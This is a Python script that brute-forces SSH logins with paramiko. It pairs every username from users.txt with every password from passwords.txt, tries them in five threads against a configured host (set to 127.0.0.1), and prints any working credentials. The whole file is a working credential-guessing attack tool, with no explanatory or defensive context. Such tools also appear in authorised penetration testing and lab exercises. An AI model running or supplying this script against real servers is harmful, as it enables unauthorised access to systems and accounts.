import paramiko
import threading
import queue
import socket

# ===== CONFIG =====
SSH_HOST = "127.0.0.1"
SSH_PORT = 22
THREADS = 5
TIMEOUT = 5
# ==================

q = queue.Queue()
found = threading.Event()

def attempt_login(username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            SSH_HOST,
            port=SSH_PORT,
            username=username,
            password=password,
            timeout=TIMEOUT,
            allow_agent=False,
            look_for_keys=False
        )
        print(f"[SUCCESS] {username}:{password}")
        found.set()
        client.close()
    except paramiko.AuthenticationException:
        print(f"[FAIL] {username}:{password}")
    except (socket.error, paramiko.SSHException):
        pass

def worker():
    while not q.empty() and not found.is_set():
        username, password = q.get()
        attempt_login(username, password)
        q.task_done()

def main():
    users = [u.strip() for u in open("users.txt")]
    passwords = [p.strip() for p in open("passwords.txt")]

    for u in users:
        for p in passwords:
            q.put((u, p))

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

if __name__ == "__main__":
    main()
